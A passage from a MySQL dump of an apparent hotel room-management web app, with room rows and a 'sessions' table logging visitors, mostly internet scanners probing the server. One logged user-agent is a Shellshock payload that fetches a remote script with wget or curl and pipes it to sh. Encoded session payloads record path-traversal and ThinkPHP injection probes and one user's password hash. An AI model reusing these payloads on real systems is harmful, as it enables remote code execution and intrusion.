14:23:00'),(181,1,5,'266','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(182,1,5,'267','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(183,1,5,'268','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(184,1,5,'269','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(185,1,5,'270','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(186,1,5,'271','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(187,1,5,'272','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(188,1,5,'273','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(189,1,5,'274','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(190,1,5,'275','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(191,1,5,'276','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(192,1,5,'277','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(193,1,5,'278','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(194,1,5,'279','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(195,1,5,'280','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(196,1,5,'281','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(197,1,5,'282','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(198,1,5,'283','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(199,1,5,'284','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(200,1,5,'285','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(201,1,5,'286','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(202,1,5,'287','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(203,1,5,'288','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(204,1,5,'289','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(205,1,5,'290','Main','Available',1,1,'2025-11-20 10:17:39','2025-11-20 10:59:39',NULL,'2025-11-20 10:59:39',NULL,NULL,'2025-11-18 14:23:00','2025-11-20 15:47:46'),(206,1,5,'294','Main','Available',2,0,NULL,NULL,NULL,NULL,NULL,NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(207,1,3,'108',NULL,'Occupied',3,1,'2025-11-18 15:05:07','2025-11-20 08:52:48',NULL,'2025-11-20 08:52:48','2025-11-20 13:21:48',NULL,'2025-11-18 14:30:46','2025-11-21 20:33:42'),(208,1,2,'117',NULL,'Uncleaned',1,1,'2025-11-21 20:49:09','2025-11-21 20:53:46',NULL,'2025-11-21 20:53:46','2025-11-21 23:53:46',NULL,'2025-11-18 14:31:07','2025-11-21 20:53:46'),(209,1,1,'119',NULL,'Occupied',1,1,'2025-11-20 10:55:17','2025-11-20 13:28:47',NULL,'2025-11-20 13:28:47','2025-11-20 16:28:47',NULL,'2025-11-18 14:31:23','2025-11-21 20:53:54'),(210,1,3,'300',NULL,'Uncleaned',2,1,'2025-11-21 21:04:31','2025-11-21 21:10:49',NULL,'2025-11-21 21:10:49','2025-11-22 00:10:49',NULL,'2025-11-18 14:32:17','2025-11-21 21:10:49'),(211,1,1,'45',NULL,'Uncleaned',1,1,'2025-11-21 21:19:28','2025-11-21 21:19:53',NULL,'2025-11-21 21:19:53','2025-11-22 00:19:53',NULL,'2025-11-21 21:12:20','2025-11-21 21:19:53'),(212,1,1,'46',NULL,'Uncleaned',1,1,'2025-11-21 21:28:29','2025-11-21 21:28:54',NULL,'2025-11-21 21:28:54','2025-11-22 00:28:54',NULL,'2025-11-21 21:12:29','2025-11-21 21:28:54'),(213,1,3,'55',NULL,'Uncleaned',3,1,'2025-11-21 21:33:14','2025-11-21 21:34:57',NULL,'2025-11-21 21:34:57','2025-11-22 00:34:57',NULL,'2025-11-21 21:13:05','2025-11-21 21:34:57'),(214,1,2,'59',NULL,'Uncleaned',1,1,'2025-11-21 21:36:25','2025-11-21 21:38:22',NULL,'2025-11-21 21:38:22','2025-11-22 00:38:22',NULL,'2025-11-21 21:13:23','2025-11-21 21:38:22');
/*!40000 ALTER TABLE `rooms` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `sessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sessions` (
  `id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` bigint unsigned DEFAULT NULL,
  `ip_address` varchar(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_agent` text COLLATE utf8mb4_unicode_ci,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_activity` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `sessions_user_id_index` (`user_id`),
  KEY `sessions_last_activity_index` (`last_activity`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `sessions` WRITE;
/*!40000 ALTER TABLE `sessions` DISABLE KEYS */;
INSERT INTO `sessions` VALUES ('1doP7DjV5gWEeSJLp9fFYumve36ibZRUgycDnW5V',NULL,'40.76.248.118','Mozilla/5.0 zgrab/0.x','YTozOntzOjY6Il90b2tlbiI7czo0MDoiVnkwVXBjUHVXNEhaNmxENjlpR3doeHRpRGFjMks0aWVWUE10ZjBqdiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763783419),('5hzEU52LporIE2bUfi4xZLCdsLzADl9r1p4it9nN',NULL,'1.37.67.134','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36','YTo0OntzOjY6Il90b2tlbiI7czo0MDoiVWNpMXhIRjdnd1NWTFpQWUFEaERMZWlJT1p3WGFRU1lmSkhuMWVRUCI7czozOiJ1cmwiO2E6MTp7czo4OiJpbnRlbmRlZCI7czozOToiaHR0cDovLzEzOS41OS4yNTIuMTAwL3Jvb21ib3kvZGFzaGJvYXJkIjt9czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mjc6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC9sb2dpbiI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763730506),('63rSpVlzTLvbgrUdvlRl8CVIYNcvgXKSrYcnN90L',NULL,'103.203.57.3','Mozilla/5.0 zgrab/0.x','YTozOntzOjY6Il90b2tlbiI7czo0MDoia2NDcEllN0pmcUJyUWw2Y3k5VnhLVlBDRk9kOE1xVmJvTjg4N09XSyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763767417),('6bgKoM6DPiwTBfPEBj694genWyw6wg9k2FaIQiuR',NULL,'104.199.26.108','python-requests/2.32.5','YTozOntzOjY6Il90b2tlbiI7czo0MDoiNEUxM3dXSUxONUVLSkpXV2dINlF4OER2Mjh4Y0JLdDV0UU54T1ZsTSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763799474),('7cLRX1lQjpt6ppqTobTTyuTPqq4aDvRMKucGOjrb',NULL,'212.132.124.111','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiZ1lkeFFWZmJ3YlBQWU5XbnN6ckxSbEJlaGpKWW9UQzZjMkRYMXVvUyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763736127),('7o1wfOKvTzUkqPTKENVG7V3KeNYFJUgfnIqiiWwt',NULL,'49.51.243.156','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoieWxMMHpaNUc4UkZDRkdkTVlyQWVXYkFvbDVYV0ZLeVJHMmQzSjAzdSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763727303),('8Hp65V1eD4I3XF5oBvxXcSC3P8sXOjo98apxrwVH',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiMDIxRTB3U3ZaUFRjcHI3QXN3bjNETVBSU2tvam9JR2VDc1JIMElHMyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763762792),('9FqEvshCWVM6b6WJ9FvKVrxQArd8Pv1MmD901j8B',NULL,'93.174.93.12','Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre','YTozOntzOjY6Il90b2tlbiI7czo0MDoiODh2c01qc3V3djVBRFBlYUFxeGh0cWJVbjVIMFJZdkRSZmFOTXZMcyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763800942),('9K958A1ty70yEFlOr565UWcynUkq5XZQRE6Wzl5O',NULL,'103.125.40.175','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiOGs0RUtXVmNxUkUwajRHT2RNRUVPR0NiSENrVHhGVWFYSnFXOHBsTyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763742920),('a1vJb6FJyi7rEgeegNpIg4x4qRAfSdL4rdE1hWJi',NULL,'165.99.250.28','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiaFdsNUVJMnl0N05yTEdJQkE5ZUdwOFFoQktIelNEeHRrUFU2NXNxdyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fX0=',1763733040),('A6H4e1ifAXwxIwkgmQ1IdVnhvWxx0fcd1LRdRQ5f',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiSHhQYUpQc0x0NUJ0Rm5IOVo3YVRyZ3ZlUDJiZUhMSFluR1NjSFVPTSI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763737462),('aHCxLFbg46MrmqKXO62tXZ1YNy4fz6KFLlKcpio4',NULL,'103.252.89.75','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiRXZHZnNac3dWb1ZXN3VaSlgzWkdqMTdTb09BQU1adEhzbzZaYlpUcyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763771159),('AHk0N1GLIznGcJr0VtzqsYF5XQ4PniCgqmmYBf9k',NULL,'15.235.224.239','Mozilla/5.0 (compatible; ModatScanner/1.2; +https://modat.io/)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiWVZYaVd6NVAzVGtzQUhEMVlJMlN6UzFhelA5Y2I2SmFQMGpmWVRXUyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763757233),('aHko3H6IQHkI6aVwCchIZXLAsV7KJd71ZbFGKmcQ',6,'165.99.250.28','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36','YTo1OntzOjY6Il90b2tlbiI7czo0MDoid0FpMDdCazZjZHJCTzJQVmYyMThxZkpCejlSdDE3QVpxc0d2V1FRaCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC9iYWNrLW9mZmljZS9yZXBvcnRzIjt9czo1MDoibG9naW5fd2ViXzU5YmEzNmFkZGMyYjJmOTQwMTU4MGYwMTRjN2Y1OGVhNGUzMDk4OWQiO2k6NjtzOjIxOiJwYXNzd29yZF9oYXNoX3NhbmN0dW0iO3M6NjA6IiQyeSQxMCR6ZkExWXMwLk43OS9Ta09FTmh4UmplYVBiL1NROElPa1hrMS54L2pjM1ZiSm5INDRyVWFDLiI7fQ==',1763732775),('B9l7V9s1Q9StqM0RgdnEn1UqEfe0intAaC0yXYGs',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiYkxmalg5RVU5SE0xNXByRnhLRnZERmx3TU9XNDNPOXRNclU5S056TCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763747761),('bF0hAbwyXV6kqv6uaAvVd5HQ9cRM8P0sDomAseOh',NULL,'212.11.64.45','Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiNllSY3h5aHhhdXpGck1hY1BTZ2NRTXI5T3c4Tm5zMmFqeXVobE0xZyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763748460),('c5OOhJO2BN7MH9mNwK7aE3z2rcEhtj4N1da4bmOW',NULL,'161.248.201.64','libredtail-http','YTozOntzOjY6Il90b2tlbiI7czo0MDoiTjNxcENWT044N1RwWHJNV05vZkc2anczOG4yUjRYdFVoMGZodVdWZSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjAwOiJodHRwOi8vMTM5LjU5LjI1Mi4xMDAvaW5kZXgucGhwPyUyRiUzQyUzRmVjaG8lMjhtZDUlMjglMjJoaSUyMiUyOSUyOSUzQiUzRiUzRSUyMCUyRnRtcCUyRmluZGV4MS5waHA9JmNvbmZpZy1jcmVhdGUlMjAlMkY9Jmxhbmc9Li4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRnVzciUyRmxvY2FsJTJGbGliJTJGcGhwJTJGcGVhcmNtZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763796715),('C84Od1YYYZBwdhnSHXFTWQggSmC7OEz8URdQIzSm',NULL,'5.187.35.21','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiQ0tXelhJbllGeXdNUlcwTXNXbm5KRUo0MEU1QnJQTkpaa3Z1QzFkQSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763750408),('c9WAldFZyIaojcU3wS0OuY28uHHDqN7v003r8jyh',NULL,'1.37.67.199','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36','YTo0OntzOjY6Il90b2tlbiI7czo0MDoiOXg0Y3NsYUFaaXFUY09ISzJDQlllU09PdDZ4M0VNdXVBTVFxY2JmOCI7czozOiJ1cmwiO2E6MTp7czo4OiJpbnRlbmRlZCI7czo0NzoiaHR0cDovLzEzOS41OS4yNTIuMTAwL2Zyb250ZGVzay9yb29tLW1vbml0b3JpbmciO31zOjk6Il9wcmV2aW91cyI7YToxOntzOjM6InVybCI7czoyNzoiaHR0cDovLzEzOS41OS4yNTIuMTAwL2xvZ2luIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763727616),('ce0IEK7QVUHD8xivgHFjyKBQsjdvxfRtZTagxKpI',NULL,'79.124.40.174','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiVTNIOXhlNUxjS3ZYMUJpWnJTaTBzR2ZVRjU4dWlCcGlTYzdJTFJzUyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NTI6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC8/WERFQlVHX1NFU1NJT05fU1RBUlQ9cGhwc3Rvcm0iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19',1763756517),('ckIUtSWgS7RfgJqGBHONgG46pG9l8v8C8xuzaV17',NULL,'192.159.99.95','() { :; }; /bin/bash -c \"(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\"& # rondo2012@atomicmail.io','YTozOntzOjY6Il90b2tlbiI7czo0MDoiRU54RUttd1Babm52NFVwZHNocHJheVZSdzQ0czNsdWZXOElMWU9udiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763784393),('co6HFsYqIUnftXqUyzZFUuQuJBTCGz9LoJb0qLAQ',NULL,'206.168.34.53','Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiM0N4eGFVcktKTDBvcUEwbVh6WWxoTXJub2IzYWNvRFJrd2Vqc3NScSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763763151),('CVREKHPBT1MeeXbIO8JJ881l49Y2rhlXeK3tQfI3',NULL,'147.185.132.30','Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity','YTozOntzOjY6Il90b2tlbiI7czo0MDoiaEV3OUd1UEZoOGpjbDNvZFlKSHJ1UDVYTWhvNG1tWmZxOGhOblNKdyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763753664),('cXY4FWUDwku31heUy2bJXgRCRFxbB5F9ke2fSIR8',NULL,'177.43.59.131','libredtail-http','YTozOntzOjY6Il90b2tlbiI7czo0MDoiSmlKcTFKQzlmenJVZnZGT2lKZ3A5UldRcFpKdjBMeGNMS1V3RkhOZCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTQ3OiJodHRwOi8vMTM5LjU5LjI1Mi4xMDAvaW5kZXgucGhwP2Z1bmN0aW9uPWNhbGxfdXNlcl9mdW5jX2FycmF5JnM9JTJGaW5kZXglMkYlNUN0aGluayU1Q2FwcCUyRmludm9rZWZ1bmN0aW9uJnZhcnMlNUIwJTVEPW1kNSZ2YXJzJTVCMSU1RCU1QjAlNUQ9SGVsbG8iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19',1763791379),('DG3tpIOoAe4sZFQ3poDQPzAv3PdhLV9IjHwL59Gv',NULL,'103.47.219.123','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7','YTozOntzOjY6Il90b2tlbiI7czo0MDoiQzkzYjlJTDFPNnJaSlUzVHgxS250M0ljNWV0MkRiWmxCbDAwdERDdSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763761663),('DG6zpoTIn57dLQ5J05sGZEFcgnrwjy3MT98ztLS4',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiaGVHcmx6R3AxdXZMdDd6U2pBYnh5dnJIS0xKNlFDRTRUT25EUFhGUCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763788471),('dPqznAGBzYtz4hyuXX5Rj8oyEG0bL6CK1tVPsVzL',NULL,'193.142.147.209','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiNHlIRDRrbWtmTlVIcUF4aGNwZW4yMEg1QTRLNEUxYkZpS0dYV0tXbCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763790541),('DVfEXMQ5AlYUHlahNpyOTJ7183WhHXj9WAluT4gr',NULL,'5.187.35.21','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiTFE5RTJNeEJqR0pSbW5oYmcwenlJbW5UdXpFSndDVjZSNHFGVDV4WiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763763508),('dVQ8Oi5r1Hhi1fcaySRSVF8PFNMvqGwPDdvItw2j',NULL,'44.202.55.27','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoieE9DRmZHVFV0ZkZST09NaWFZU0x4SmptRzVtekNuakRKMkV5UDJLbSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763763466),('dy3h2CXbBLG6PWhWqr7FnmJvIpKJv3w1ATqkcvNN',NULL,'168.76.20.229','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiWkRSRkJPNVRZTUlvREI5a3p5S2diMkpFYTVkRXJNWkZjNFFZeVdHQyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763785409),('eM4KuKybZl7OH8UMqTtZ6JRrQJNrGrdjuvNLfXPd',NULL,'195.184.76.108','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoic1dDcVZ1aXVGV2hvRlBrSjhseG9yamc2VXlDQTFHbnZCd2xlTWw3QiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763760191),('EQ62YjQT1DBNi1046Sj7kbsbJaR3jyIUkTvwpB6n',NULL,'103.125.40.175','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 